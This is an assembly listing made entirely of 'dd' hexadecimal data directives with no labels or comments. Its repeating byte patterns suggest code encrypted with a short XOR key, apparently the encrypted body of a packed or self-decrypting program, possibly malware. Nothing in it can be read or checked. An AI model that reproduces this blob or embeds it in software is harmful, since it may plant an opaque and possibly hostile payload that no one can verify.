		dd 7F6D907Fh, 907F6D90h, 6D907F6Dh, 0B37653BEh,	8BBAF124h
		dd 7657B914h, 10CE04BAh, 7C662F85h, 0A07EFFD9h,	66E54564h
		dd 0EBFFD944h, 0D95C64F9h, 0CBB18BF7h, 8B1C7610h, 0F94064FCh
		dd 24771865h, 1C9AE33Ah, 0E9742679h, 65FC5865h,	1B1C7CBh
		dd 3D83E188h, 0ED3B83EDh, 0E09A3484h, 0F8EB2FCEh, 377EC0F4h
		dd 742F78FFh, 0D94C64B1h, 2E7E47FFh, 8915C604h,	8110CBB1h
		dd 0CBA18B5Bh, 24937418h, 0ED55D4EDh, 0ECE68DE0h, 1C85FD00h
		dd 0FC0DC415h, 6C2D8BEFh, 0D26AF9C4h, 0FCE66BF2h, 957000EFh
		dd 0E94404h, 3D33EFFDh,	8AF10228h, 0AB1CED01h, 0FD013E14h
		dd 0CBA18BEFh, 2493741Ch, 89DB6AEDh, 0F7B88BBDh, 8B57C98Bh
		dd 3D85E7BBh, 7AD099Bh,	0EEF1EEh, 76042B7Eh, 10348314h
		dd 0AE1D3D33h, 15513E0Ah, 0EFFC0C3Bh, 0FB642D8Bh, 0CEFF267Eh
		dd 0EB39832Fh, 0F2E7AB89h, 0D6D11853h, 643C8B16h, 0C11576F7h
		dd 58F3ED14h, 0E7EC864h, 8B4B0E03h, 7610CB81h, 6ADD24B3h
		dd 8BBD89DBh, 0C98BF7B0h, 0E3BB8B56h, 99B3D85h,	0F19407ADh
		dd 2B7E00EEh, 83147604h, 3D331034h, 3E0AAE1Dh, 0C951551h
		dd 2D8BEFFCh, 267EFB64h, 832FCEFFh, 0AB89EB39h,	1853F2E3h
		dd 8B16D6D1h, 76F7643Ch, 0ED14C115h, 0C86458F3h, 0E030E7Eh
		dd 0CB818B4Bh, 24B37610h, 89DB6AD9h, 0F7B08BBDh, 8B56C98Bh
		dd 3D85FFBBh, 7AD099Bh,	0EEF13Ah, 76042B7Eh, 10348314h
		dd 0AE1D3D33h, 15513E0Ah, 0EFFC0CCFh, 0FB642D8Bh, 0CEFF267Eh
		dd 0EB39832Fh, 0F2FFAB89h, 0D6D11853h, 643C8B16h, 0C11576F7h
		dd 58F3ED14h, 0E7EC864h, 8B4B0E03h, 7610CB81h, 6AD524B3h
		dd 8BBD89DBh, 0C98BF7B0h, 0FBBB8B56h, 99B3D85h,	0F6E007ADh
		dd 2B7E00EEh, 83147604h, 3D331034h, 3E0AAE1Dh, 0B291551h
		dd 2D8BEFFCh, 267EFB64h, 832FCEFFh, 0AB89EB39h,	1853F2FBh
		dd 8B16D6D1h, 76F7643Ch, 0ED14C115h, 0C86458F3h, 0E030E7Eh
		dd 0CB818B4Bh, 24B37610h, 89DB6AD1h, 0F7B08BA1h, 8B56C98Bh
		dd 3D85F7BBh, 7AD099Bh,	0EEF686h, 76042B7Eh, 10348314h
		dd 0AE1D3D33h, 15513E0Ah
		dd 0EFFC0B83h, 0FB642D8Bh, 0CEFF267Eh, 0EB39832Fh, 0F2F7AB89h
		dd 0D6D11853h, 643C8B16h, 0C11576F7h, 58F3ED14h, 0E7EC864h
		dd 5F4B0E03h, 0FCB8B2A3h, 0B4FD00EFh, 0F73F59h,	0B08B3DCEh
		dd 0F7B88BEBh, 14662685h, 0F94D6475h, 64E55564h, 489B7734h
		dd 7804A976h, 0BFF4742Fh, 1E4E4E8h, 0F9C46CFDh,	267EFB64h
		dd 0F22FCEFFh, 0ACD11853h, 0EEF7FF07h, 8B3F7600h, 2C96C06h
		dd 2B7EC0DCh, 4B97404h,	2CF7410Fh, 2E76F9C4h, 0FA640A8Bh
		dd 0E02063Ch, 6C358B4Ah, 0A41CFEE1h, 7604A276h,	9B7618BAh
		dd 1C64E124h, 89F66A77h, 0E7BE8BA7h, 99B3D85h, 0F7C007ADh
		dd 2B7E00EEh, 83117604h, 3D331034h, 3E0AAE1Dh, 0A491551h
		dd 2D8BEFFCh, 267EFE64h, 832FCEFFh, 0AE89EB39h,	1853F2E7h
		dd 8B16D6D1h, 76F7643Ch, 0ED14C115h, 0C86458F3h, 0E030E7Eh
		dd 0CBB18B4Bh, 4BA7620h, 0AC18AA76h, 0E3760285h, 851590h
		dd 0B18BEFFDh, 0BA7624CBh, 18AA7604h, 760385ACh, 0BA1590E3h
		dd 8BEFFD00h, 7628CBB1h, 0AA7604BAh, 485AC18h, 1590E376h
		dd 0EFFD00AFh, 2CCBB18Bh, 7604BA76h, 85AC18AAh,	90E37605h
		dd 0FD00C415h, 0EBB88BEFh, 89B1BD5Fh, 455DEBB8h, 0EFFD00EEh
		dd 182DA45Bh, 0A05EB0FDh, 0B6A6C0DCh, 90EFE5C2h, 6D907F6Dh
		dd 7F6D907Fh, 907F6D90h, 0D95C64AEh, 1E7656E3h,	529B2685h
		dd 0D96C64A8h, 0AB7657FFh, 0C06AF9AEh, 1550E689h, 0EFFC0909h
		dd 8BEB3983h, 2C96C06h,	410FC0DCh, 0E8BE2CF7h, 0FD01E631h
		dd 1476D064h, 33103483h, 0F9C46C3Dh, 0EB535466h, 0D11853F2h
		dd 3C8B16D6h, 1576F764h, 0F3ED14C1h, 7EC86458h,	4B0E030Eh
		dd 5BB1A05Fh, 6D00E73Fh, 7F6D907Fh, 907F6D90h, 6D907F6Dh
		dd 0B9248BBCh, 0CEC3A57h, 7010EE98h, 0E942049Ch, 8BEFFD00h
		dd 89C06AFBh, 981550E6h, 83EFFC09h, 3B83EB39h, 4884FEBh
		dd 10CBB9F6h, 0AE099BFCh, 0EEF46107h, 42B7E00h,	0A3C364A2h
		dd 0EFF9C2B4h, 24837655h, 0ABED6AF5h, 0DA76609Bh, 10EE9CB8h
		dd 78D610A8h, 0BCAE742Fh, 0D610A857h, 1BD11F76h, 0E6D7E8B9h
		dd 8BB9FD01h, 0F4220705h, 2B7E00EEh, 56377608h,	0A8FF85AAh
		dd 6950085h, 0FFEFFDFDh, 0FC617BE8h, 85FD6AFFh,	6ABCAB00h
		dd 0FD6AB802h, 0FA020085h, 10EE9C2Ch, 0F5F807AAh, 2B7E00EEh
		dd 5F2C7604h, 3F5DB1A6h, 57A300EBh, 10EE1FA4h, 0FD042DA0h
		dd 7F6D907Fh, 907F6D90h, 6D907F6Dh, 5C95FF85h, 64FFFC52h
		dd 0FD00EF5Ch, 669950EFh, 0EFFD25h, 0B98BBEFDh,	64AB14CBh
		dd 7466ADF1h, 0E4E8E7D9h, 65FD008Ah, 6AF7D94Ch,	0D94428E5h
		dd 0EFFD00FBh, 10A17500h, 0FC087C15h, 66FD89EFh, 0C46CF940h
		dd 0E94666F9h, 0EFE54628h, 8BEFFD00h, 0D9442933h, 0E93A01FFh
		dd 10EE9810h, 0FD1CA93Ah, 7FD00EFh, 0EFF8B8h, 0F524A376h
		dd 8BA3C664h, 0EFF089h,	3983EFFDh, 0EFF9C2FFh, 907F6D90h
		dd 15F164ABh, 0EFFD00F7h, 8CBB9F6h, 0AB099BFCh,	0EEF54107h
		dd 42B7E00h, 3F5E2976h,	7F6D00EBh, 0D387026Ah, 9910EEAFh
		dd 0EFFD004Eh, 898BAD00h, 0FD00EFD8h, 0E31183EFh, 57B9A853h
		dd 81891676h, 0E83A14CBh, 10EE9810h, 3A148076h,	0EED924ABh
		dd 8BEFFD00h, 203BEFA0h, 1C76329Bh, 185E68Bh, 7604A976h
		dd 64F589E1h, 4A97616h,	7408A170h, 0FA0204ADh, 10EE9F7Ch
		dd 0FAD807ABh, 0A07600EEh, 42B7E18h, 74DDD4B4h,	218818A0h
		dd 0C6FBA28Bh, 0FD24CBB9h, 4C62B64h, 4C62B574h,	0FD6AF7D9h
		dd 8276C564h, 4C62AC00h, 0B989F7D9h, 0A21518CBh, 8BEFFD13h
		dd 760085CDh, 0F97604A9h, 664ED89h, 7404A176h, 0A17004A7h
		dd 143D1508h, 1556EFFDh, 0EFFC076Dh, 83F7B28Bh,	0C649EB39h
		dd 0F7B28904h, 47644575h, 96E8BFE9h, 0DCFD01E8h, 42B7EC0h
		dd 0BA892076h, 0F7BA89FBh, 24CBB9C7h, 2FF1002h,	0EF990B07h
		dd 24A37600h, 0A05EB0E1h, 0E27464B4h, 0EFFD00h,	3E182B7Eh
		dd 7F6D907Fh, 907F6D90h, 0F924AB76h, 0DC0C8BB9h, 83E777C9h
		dd 483113Ch, 2A7A0FE1h,	0FFEFFD00h, 0B42062D9h,	64BD10EFh
		dd 1907ADCEh, 0A300EFFBh, 0AFFD082Dh, 20FA0250h, 9710EE9Ch
		dd 7338B83h, 0EFF604h, 0FD082DA3h, 0BF338BAFh, 0E83AE8h
		dd 766C85FDh, 0E513E821h, 0C2B1FD00h, 7640EFF5h, 1E155021h
		dd 5EEFFD0Ah, 0BD00E73Fh, 7ADCE64h, 0EFF484h, 0FD082DA3h
		dd 0BF338BAFh, 0FE7AE8h, 0F5C2B1FDh, 217640EFh,	11751550h
		dd 3F5EEFFDh, 217600E7h, 0E1F2E8h, 0F5C2B1FDh, 217640EFh
		dd 11AD1550h, 3F5EEFFDh, 64BD00E7h, 0B507ADCEh,	0A300EFF3h
		dd 64FD082Dh, 49E3D94Ch, 7650BEBDh, 0FF7FE821h,	0C2B1FD00h
		dd 9740EFF5h, 217650EAh, 0EE2EE8h, 0F5C2B1FDh, 0EF9740EFh
		dd 0E8217650h, 0FD00EE39h, 0EFF5C2B1h, 10EFB55Eh, 0ED00A76Bh
		dd 0FFFD480Dh, 10EFB5EFh, 0ED00A6E1h, 0FFFD484Ch, 10EFB5CAh
		dd 0ED00A796h, 0FFFD486Fh, 10EFB5D5h, 0ED00A74Dh, 0FFFD4852h
		dd 10EFB41Ch, 0ED00A6FFh, 0FFFD49FEh, 907F6D90h, 97EC64A8h
		dd 8AE56810h, 3087ED01h, 9910EEB2h, 0EFFD004Eh,	898BAD00h
		dd 0FD00EFD8h, 0FB1183EFh, 89B8AB53h, 0B8C70798h, 0EFFD0013h
		dd 89A7600h, 451510ABh,	0AFED018Eh, 0FCFA0250h,	7E10EE9Fh
		dd 1776042Bh, 85338089h, 0F384E002h, 0B9FD00EEh, 44FA0257h
		dd 7610EE9Ch, 0B888918h, 75B3C280h, 0FC4762B6h,	9AA1386Fh
		dd 891F7643h, 74460B88h, 0E977E49Ah, 0F9B3D84h,	0F674B3C1h
		dd 9FE8FFB9h, 8BFFFC63h, 7DE8040Dh, 0EB8900D1h,	0E49A7446h
		dd 3D84E977h, 0B3C10F9Bh, 0FFB9F674h, 0FC639FE8h, 40D8BFFh
		dd 0D17DE8h, 0E6EBCE89h, 6FFC4762h, 179AC738h, 88891F76h
		dd 9A74460Bh, 84E977E4h, 0C1089B3Dh, 0A9F975B3h, 8B0B8889h
		dd 0FC6077E0h, 6BFB8AFFh, 3CA589C0h, 3B389AA1h,	10AA00E9h
		dd 0E0AA74D3h, 88FF177Eh, 0B8FD6AF2h, 600FE8FFh, 3D85FFFCh
		dd 0FA021A9Ah, 10EE9C7Ch, 0FD0058C0h, 0B8F074EFh, 0E06CB3EBh
		dd 8910D3EDh, 0AB1657ECh, 56B3FBC6h, 9E70FA02h,	1F7610EEh
		dd 0EB0B8889h, 145284Dh, 1002FF10h, 0F4FA0257h,	7E10EE9Fh
		dd 0EE4D042Bh, 641FB08Bh, 0FD00E274h, 0B1A200EFh, 5D0A765Bh
		dd 4500EB3Fh, 0EFFD00EEh, 0E88A76C3h, 0ADDCAA76h, 8D091510h
		dd 0C46CED01h, 14528F9h, 1002FF10h, 4D643D32h, 0F0898B0Dh
		dd 0EFFD00EFh, 8BB4A35Fh, 0F9C2B218h, 7F6D90EFh, 907F6D90h
		dd 0FE54037Ch, 0BAAE00EFh, 4156AA56h, 0CE00EFFDh, 0CB818D2Fh
		dd 0F3C1976Ch, 0D9846456h, 0EFFD0383h, 18CBB9C7h, 0FD00EEF9h
		dd 2FE8FFBFh, 83FFFC62h, 3D85E739h, 0B1A20F9Ah,	5B2FCF5Dh
		dd 0FE542B7Ch, 0E73F00EFh, 2CC27600h, 7010EE9Dh, 0BEED24A3h
		dd 0FEFC268h, 0AD0085FDh, 0EFFD0087h, 853A0280h, 0A20F9B3Dh
		dd 2FCF5DB1h, 542B7C5Bh, 3F00EFFEh, 0A37600E7h,	3564ED24h
		dd 0ED018FB5h, 0FBD95462h, 6CCBB98Dh, 0FD6ABFAFh, 642BFFBEh
		dd 8BFFD954h, 0FC60CFE0h, 3C0252FFh, 0EF80B9h, 70C0DCFDh
		dd 0EE8D2453h, 0AB1CFD00h, 9124AB70h, 9FD98C62h, 50EFFD01h
		dd 0FCD3C795h, 0FA0251FFh, 10EE9E4Ch, 700C2B7Eh, 62ED24BBh
		dd 19FD984h, 9552EFFDh,	0EFF200D0h, 68BFFD6Ah, 7D00EFFDh
		dd 2F78D510h, 5EB0F274h, 0A6C0DDA0h, 0ECA9C46Eh, 82DFD00h
		dd 0FD4156FDh, 2FCE00EFh, 6CCB818Dh, 9124BB70h,	0A370AB1Ch
		dd 4428E924h, 0FC04FBD9h, 0BDAC00EFh, 24AB7650h, 2BFFBFE1h
		dd 0FFD94C64h, 8B3C0251h
		dd 0FC6217C8h, 0CBA98DFFh, 0D3CB956Ch, 252FFFCh, 0E7398339h
		dd 369A3D85h, 9124AB70h, 0EE2E2087h, 0D610AD10h, 78082B7Eh
		dd 64DE752Fh, 18E7535h,	0D94C62EDh, 3CE16883h, 0FFBEED01h
		dd 0D994642Bh, 0EFFD0387h, 6CCBB98Dh, 2BFFBFAFh, 63760F04h
		dd 0EC9524h, 250BEFDh, 0EE9C44FAh, 0FF4410h, 3D33EFFDh
		dd 0C3D97C62h, 846456F3h, 0FD0383D9h, 0CBB9C7EFh, 0EFB928h
		dd 89C06AFDh, 0CBB9C7E7h, 13CF130h, 0D95462EDh,	0CBB98DF7h
		dd 6ABFAF28h, 970085FDh, 85FD6AEFh, 24637000h, 0FD00EF75h
		dd 85AC0085h, 9CFA0200h, 0A210EE9Dh, 6EA65DB1h,	0ECA9C4h
		dd 0FD082DFDh, 7F6D907Fh, 907F6D90h, 0FA84037Ch, 62AE00EFh
		dd 1C7D984h, 0AD55EFFDh, 0C7D94C66h, 0EEFD68h, 0D98429FDh
		dd 0EFFD037Bh, 0ACFA0267h, 7710EE9Dh, 0EED1246Bh, 0D2DCFD00h
		dd 518D2F79h, 0EFFC2CCBh, 24BB7400h, 0D95466EDh, 0CBA989FBh
		dd 24BB7418h, 0FD0154E1h, 6BF200EFh, 0EFFC49h, 0FFEBB8ABh
		dd 0AE44D2DCh, 33EFFD00h, 0D97C623Dh, 0EEF968DFh, 0AB1CFD00h
		dd 0C924A370h, 0BDAF52BEh, 0FFBAAF52h, 0FC6047E8h, 0EBED68FFh
		dd 9462FD00h, 0FD02D7D9h, 0EE9D68EFh, 68BDFD00h, 0FD00EF7Dh
		dd 0D7E8FFBAh, 8BFFFC63h, 0FC6157C8h, 0CB798DFFh, 0EFFE44h
		dd 76D610ADh, 0CBB18D17h, 89BEBA30h, 22CCB81h, 0AB744039h
		dd 4565E924h, 8941D3FDh, 9BBF3CA8h, 24BB7043h, 700085E5h
		dd 0BDD924ABh, 1510A850h, 0ED018F59h, 0C389C06Ah, 18CBB98Bh
		dd 0E124BB76h, 0EFFD1456h, 1F11500h, 0A98BEFFCh, 1F7624CBh
		dd 20CBB98Bh, 0FD00FB44h, 0EEF7E8EFh, 4466FD01h, 0FBEBFFD9h
		dd 9B74F6DCh, 4D65ED24h, 7188BAFDh, 0EFFE98F3h,	0A0FA0200h
		dd 7610EE9Dh, 64ED24BBh, 1C6B75CFh, 0FD00EC68h,	5B74C164h
		dd 0EC6B1Ch, 0D9B462FDh, 0EFFD03ABh, 9EF3418Dh,	7400EFFEh
		dd 0EC671C7Bh, 0E92EFD00h, 76A51CFFh, 0CBB98B27h, 30E7E28h
		dd 76A41CA8h, 62E524A3h, 7462E514h, 418DDBD9h, 0EFFEA2FBh
		dd 0C13E7600h, 58F3ED14h, 0E7ECA64h, 8B4B0E03h,	70C8EC37h
		dd 10F70BB3h, 18E4515h,	0D56C62EDh, 0EF8080EEh,	0BD6AF200h
		dd 0A2FF1003h, 0CBB18BB1h, 247B7024h, 0FD00EC71h, 1E1552BCh
		dd 5DEFFD5Dh, 79C46EA6h, 2CFD00E8h, 907F6D90h, 6D907F6Dh
		dd 0EDA9EC6Eh, 56BAFD00h, 0D50051AAh, 167600EFh, 89AF9756h
		dd 3A20CB81h, 0EFFD1CA8h, 7466FD00h, 0E8FFF3D9h, 0FFFC6053h
		dd 8464158Bh, 0FD028BD9h, 637050EFh, 0EE9D24h, 2E4887FDh
		dd 10AC10EEh, 18CB115h,	0F1C46CEDh, 0F3D95462h,	5CCB798Dh
		dd 0AF00EFFCh, 0BE8FFBFh, 83FFFC61h, 0B9891005h, 0F08810CBh
		dd 0FCBB18Dh, 7651EE97h, 0CBB9C620h, 69079517h,	0A200EFA0h
		dd 2B7C5DB1h, 0EFFF54h,	0AE00EB3Fh, 87FD4529h, 0EFFCBBh
		dd 760404FDh, 62E5249Bh, 0FF120596h, 8BDAD402h,	0E73B81F9h
		dd 6AEFFD02h, 7455B9BFh, 10D9249Bh, 18F4515h, 42E864EDh
		dd 0FFFCD3ABh, 4CCB898Dh, 0EA8AE177h, 25C7C165h, 0C06BE375h
		dd 0AB8AF989h, 0EEB28AEEh, 0D1D53F8Ah, 3B83E188h, 0ED3A83EDh
		dd 0DC9A3D84h, 0F8EB2FCEh, 377EC0F4h, 0F2F78FFh, 0FD007D79h
		dd 3CBDBFEFh, 7462ED01h, 0F38AA3D9h, 2E771765h,	1E9A373Ah
		dd 0EB742F79h, 65FC5665h, 0C265FC4Fh, 0F3753EC7h, 6CFFC66Ch
		dd 0C06BFFC7h, 3D333388h, 2FE60504h, 85102583h,	77589B3Dh
		dd 62DD24ABh, 24A3D94Ch, 0F988BEEDh, 0FA0243C4h, 10EE9CB8h
		dd 898D2776h, 3E764CCBh, 0C1C4C18Dh, 58F3ED14h,	37FECA64h
		dd 43EC1C83h, 0B9C64B0Eh, 64FDFFC4h, 89D3D944h,	0B18BC4F9h
		dd 0A37440CBh, 5464F92Bh, 3E83DBD9h, 0C4E989E7h, 38CBB98Bh
		dd 0F92BAB74h, 64F5C36Ch, 8DFBD954h, 0AC20CBB1h, 5BE8FFBDh
		dd 85FFFC60h, 985E03Dh,	6402FF11h, 53F3D94Ch, 0A13A07A8h
		dd 64A800EFh, 0B0FA02F0h, 7610EE9Dh, 0BFE924ABh, 6103E8FFh
		dd 765BFFFCh, 0B2A35F29h, 2BB3981h, 0F9C2EFFDh,	7F6D90EFh
		dd 907F6D90h, 0F94C037Ch, 6B7000EFh, 0ECB524h, 0AB55BCFDh
		dd 0B3D9B464h, 57EFFD04h, 9E4CD276h, 87AB10EEh,	10EE2E48h
		dd 2500676h, 0E3398338h, 10CBB18Dh, 0A5247B70h,	0BEFD00ECh
		dd 0E4FA0252h, 7610EE9Ch, 10068337h, 5EB0F275h,	0A6C0DDA0h
		dd 0EBB1C46Eh, 42DFD00h, 0D97C6FFDh, 0A4892ED3h, 10CBB9F6h
		dd 0D94462EDh, 87AB50D3h, 10EE2CFCh, 718DF189h,	0EFFC5CCBh
		dd 0D710AC00h, 70102B7Eh, 0EEAD247Bh, 0CD64FD00h, 27607AFh
		dd 0F416FF10h, 60CB718Dh, 0AC00EFFFh, 2B7ED710h, 247B7010h
		dd 0FD00EDA9h, 0CFE8FFBDh, 8DFFFC61h, 0AD10CBB9h, 5BE8FFBCh
		dd 85FFFC60h, 0AE9E9A3Dh, 8E111510h, 0FFB9ED01h, 0FC602FE8h
		dd 6AA35FFFh, 0FB4A0C0h, 39812F68h, 0EFFD04A3h,	90EFF9C2h
		dd 6D907F6Dh, 7F6D907Fh, 53E71183h, 0DD5162ABh,	0CBB189B8h
		dd 24B37610h, 0FD4156E5h, 2FCE00EFh, 85078Bh, 68B440Eh
		dd 1D02C96Ch, 2B3E0AAEh, 0FD808704h, 2E7600EFh,	0FA640A8Bh
		dd 14C1EC97h, 6458F3EDh, 83EF97C8h, 0FC6AEC1Ch,	0EFFD0087h
		dd 0A41CAE80h, 9CD0FA02h, 177610EEh, 75100283h,	0CE5EB0F6h
		dd 2B7E5B2Fh, 0EB3F08h,	0F124A370h, 10AA51BAh, 18E2915h
		dd 0D8BB8EDh, 8E1D1510h, 0FFBCED01h, 0FC6157E8h, 6C158BFFh
		dd 6ABAF7C5h, 411510BDh, 64ED018Fh, 8B3776CDh, 76C0DC2Ch
		dd 0ED14C114h, 0CA6456F3h, 0E030E7Eh, 86FEC645h, 10CBB98Bh
		dd 76059C74h, 0B9E1249Bh, 0FFEEBE89h, 0FC6157E8h, 62358BFFh
		dd 55AEF47Bh, 3C533E76h, 4A0E0206h, 0E16C378Bh,	76A41CFEh
		dd 7E124A3h, 0EFA754h, 2F064AEh, 0EE9DB0FAh, 0C664A010h
		dd 7E5BB1A2h, 0EB3F082Bh, 907F6D00h, 6D907F6Dh,	7F6D907Fh
		dd 907F6D90h, 0D95C64AEh, 64AA55E7h, 0E964F943h, 88FF177Eh
		dd 0EF37E8E2h, 5DB0FD00h, 3F5B2FCEh, 0EF9700EBh, 0EF7D68h
		dd 970385FDh, 62FC6AEFh, 87DD45h, 0AD80EFFDh, 8E2D1510h
		dd 0F864ED01h, 88FF107Eh, 0E4A05FE7h, 42DA6C0h,	0F94B64FDh
		dd 0BCFD6AB9h, 1510AA51h, 0ED018E35h, 0EFDD0087h, 0C7AF9700h
		dd 0FD1CCBB9h, 10FD00EFh, 18F4115h, 70F064EDh, 85E924A3h
		dd 629AC00h, 74136497h,	0AC7601B9h, 9B97004h, 0FD1F1895h
		dd 66AA52EFh, 1510F846h, 0ED018E21h, 0FE8FFB8h,	8BFFFC61h
		dd 7814CBB9h, 6CE3762Fh, 0CD64F4C0h, 7CE8B9ADh,	0B9FD00B6h
		dd 1510058Bh, 0ED018F4Dh, 0B0A3C764h, 42DA65Dh,	15CD64FDh
		dd 0EFFD00F7h, 14CB818Bh, 4D1510ABh, 64ED018Fh,	5DB0A3C7h
		dd 0FD042DA6h, 7F6D907Fh, 0F964AA56h, 0BA8BEE97h, 64CD8BFBh
		dd 1664F94Eh, 0FB8BFE74h, 66F94E64h, 4E62F948h,	811510F5h
		dd 0B9ED018Dh, 13C0E8h,	0E54F64FDh, 0A6F9C46Ch,	4F663C8Bh
		dd 88C06AE5h, 64966AE3h, 0C115CFh, 0A35FEFFDh, 0FBAA8B2Ch
		dd 4064FF8Bh, 88C06AF1h, 8D85A1EAh, 8BBFED01h, 0C20732h
		dd 0B1A2FF10h, 907F6DC3h, 6D907F6Dh, 7F6D907Fh,	907F6D90h
		dd 0F924AB70h, 7AD0185h, 0EFA5D4h, 6D00EB3Fh, 0EFFDA18Bh
		dd 0FF85FD00h, 0FC520695h, 669950FFh, 0EFFD25h,	0EDEC6CFDh
		dd 64AB55BCh, 8BC3D974h, 0E8FFB914h, 0FFFC6157h, 0FFDF8180h
		dd 0AB219AA1h, 615CD64h, 8BEFFD00h, 2633F7B8h, 6AF2C3D4h
		dd 0EFFDABh, 0F8E82276h, 6FD00ECh, 0EFFDB8h, 0D124AB77h
		dd 0CBB988B8h, 83117610h, 3D331034h, 410FDBDCh,	89A62CF7h
		dd 0AC14CBA1h, 0CBB18DB9h
		dd 24B37418h, 0D95C66DDh, 9FE8FFCBh, 8BFFFC62h,	888DFB80h
		dd 0CBA189FFh, 4A07628h, 338BB8ACh, 0EFFBCB07h,	4A87400h
		dd 7004A776h, 66ED24BBh, 82F7E01h, 0F8E8BFAFh, 64FD00E8h
		dd 4464F556h, 3983F3D9h, 2CC642E7h, 0C7E7AB89h,	228CBB9h
		dd 0B002FF10h, 4862E074h, 2406502h, 0E589C3D5h,	69B023Ch
		dd 0FC882703h, 7AC0904h, 0EF0606h, 74042B7Eh, 66ED24B3h
		dd 89FBD95Ch, 7618CBA1h, 0EF7614AAh, 3BE3BD8Bh,	5C059A3Eh
		dd 0FFFC6297h, 0E8227650h, 2FF1365h, 0F3D94C64h, 15FA05Eh
		dd 0F0898BA6h, 0EFFD00EFh, 0C2F33983h, 6D90EFF9h, 0E395FF85h
		dd 64FFFC53h, 0FD00EF5Ch, 669950EFh, 0EFFD25h, 91EC6EFDh
		dd 0BAFD00EBh, 245B7656h, 0FD00EB79h, 0E7D94C66h, 0AE4457h
		dd 3D33EFFDh, 9FD9BC62h, 0F3EFFD02h, 0E8FFB956h, 0FFFC6157h
		dd 0FFDF8180h, 420B9BA1h, 0FFFCD3B7h, 14CB8189h, 0B9C7E316h
		dd 0D5914CBh, 7C64ED01h, 0D08BFBD9h, 0FFFC63A3h, 8462AB57h
		dd 0FD0297D9h, 3CAD68EFh, 0FFBFED01h, 0EDC46C28h, 0C3D94C62h
		dd 70CB698Dh, 0AC00EFFFh, 0BE8FFBDh, 83FFFC61h,	0B9891005h
		dd 0E88828CBh, 76063D32h, 0AE00EFFCh, 937DDBDCh, 0FC1A124h
		dd 0FD01AD79h, 0CBB9F6EFh, 4462ED30h, 0AA50B3D9h, 3E4D68B9h
		dd 239BED01h, 75246370h, 0BEFD00ECh, 4C6428FFh,	3983CBD9h
		dd 0CB698DFBh, 0EFFE78h, 22607AFh, 0E314FF10h, 8DEFFD01h
		dd 0FC80CB71h, 10AC00EFh, 245370D5h, 0FD00EE79h, 0DC02C96Ch
		dd 142B7EC0h, 0A98A410Fh, 0EE9717CBh, 88A62CF7h, 7620CBA9h
		dd 0CBB18D06h, 5C66A820h, 0A189C7D9h, 0B3742CCBh, 1510CD24h
		dd 0ED018D91h, 0C989C06Bh, 20CB818Bh, 3C8B2276h, 9FD9B462h
		dd 0C1EFFD01h, 58F3ED14h, 0E7EC864h, 8B4B0E03h,	7420CBB1h
		dd 67D92483h, 5464D41Ch, 0E56AFFD9h, 67D99C66h,	8BEFFD04h
		dd 838BFB8Fh, 16A3E8EBh, 0C46CFD00h, 76F3D4F9h,	64FF7521h
		dd 3BE774C8h, 88CF6406h, 66358BEDh, 4666F948h, 0F94864F9h
		dd 0A3700166h, 0C06CE124h, 1550BEF5h, 0EFFD05EFh, 18CBB98Bh
		dd 3A082B7Eh, 0EB79246Bh, 0FF10FD00h, 0AD8B1002h, 0BF7442F7h
		dd 24AB7618h, 89C3D4DDh, 10B58DF2h, 3A10BD8Ah, 0C10A9B3Eh
		dd 11FB7410h, 0EBEE75C8h, 6E8BEF4h, 6CFD0017h, 7C64F9C4h
		dd 498BF7D9h, 0EFF98CCBh, 4CC27600h, 7410EE9Eh,	66DD24B3h
		dd 89CBD95Ch, 7628CBA1h, 62D124ABh, 52DFD954h, 491510ADh
		dd 6AED018Fh, 9B6AF2C0h, 76FF1003h, 0BED124A3h,	6103E8FFh
		dd 0FCB0FFFCh, 0CB718BB4h, 0EFF978h, 995DB1A2h,	0EFFD0D66h
		dd 0C46EFD00h, 0FD00EB85h, 7FFD042Dh, 907F6D90h, 248BBCACh
		dd 0F7BE8BBAh, 84E03D85h, 0FD00EF61h, 66E94364h, 8BE7D944h
		dd 0F2E8D4D5h, 0EFFD8B6Bh, 8BB8AB00h, 0FD6D6400h, 64F94764h
		dd 898700Fh, 0EA8BE774h, 66F94764h, 4664F942h, 89C06AF9h
		dd 217650ADh, 6287E8FFh, 0C580FFFCh, 64DC74EFh,	8BBEF94Eh
		dd 95151033h, 6FED018Dh, 109B0238h, 7604B976h, 0FA025221h
		dd 10EE9F68h, 0EEEBE703h, 64F14664h, 0C06CF94Eh, 0AC50A6FFh
		dd 2215CE64h, 33EFFD03h, 0BB89B83Dh, 0E7BB89EBh, 0E8E3BB89h
		dd 0FD0017FFh, 64E54B64h, 83FBD944h, 0C649EB39h, 0F7B68907h
		dd 0FF96780Fh, 0A35F1002h, 24766B85h, 0FF1416E8h, 0A45BB202h
		dd 7F6D902Ch, 907F6D90h, 0FC40037Ch, 7B7600EFh,	0EEB924h
		dd 0AEC0DCFDh, 0B9A8D964h, 57CF968Dh, 0FD00AE44h, 1C008BEFh
		dd 89570ABh, 0FFF267Eh,	0C42CF741h, 0C164A8F9h,	8B1876h
		dd 1CFFE92Eh, 832776A5h, 59F3EC1Ch, 66F94A64h, 0EED58Bh
		dd 3ACB64FDh, 0EFFC2C6Ch, 0EFFD00h, 0C6607FDh, 0BB70FF10h
		dd 55BDED24h, 9CE4FA02h, 1F7610EEh, 74100383h, 0E14364D2h
		dd 9BF9F86Ch, 2177E27h,	583CD89h, 85E074E9h, 0E824766Dh
		dd 2FF14A5h, 3E8FFB9h, 5FFFFC61h, 7C5BB2A3h, 0EFFC402Bh
		dd 0EB3F00h, 0E0E82476h, 0B9FD00EFh, 6103E8FFh,	0A35FFFFCh
		dd 2B7C5BB2h, 0EFFC40h,	6D00EB3Fh, 7F6D907Fh, 907F6D90h
		dd 0FC50037Ch, 64AE00EFh, 4B64ABD9h, 7EC164E1h,	0F3890207h
		dd 74ED1583h, 0FFE86CEDh, 1E76049Bh, 551EEEBh, 1600EFFDh
		dd 0EFFEBEE3h, 504FD00h, 0FD00EE43h, 0AB7057EFh, 7B62E124h
		dd 257BFDDh, 0EE9CE4FAh, 8326CE10h, 0B1891005h,	0AB3B0CCBh
		dd 899FF124h, 7510CBB1h, 9BE924A3h, 1117E46h, 0A98BF888h
		dd 0A37638CBh, 5466C124h, 0B189E2D9h, 0EC4311CBh, 0EBEFFD00h
		dd 0FEFE6CC2h, 3DCE119Ah, 0EFFFBEh, 0D95466FDh,	0CBA989E2h
		dd 83C61611h, 0DD75EA03h, 0FED94428h, 0FF1002FFh, 0FD00EC43h
		dd 0DCE8EBEFh, 0ED43C9h, 0B189EFFDh, 0A3740DCBh, 404EC24h
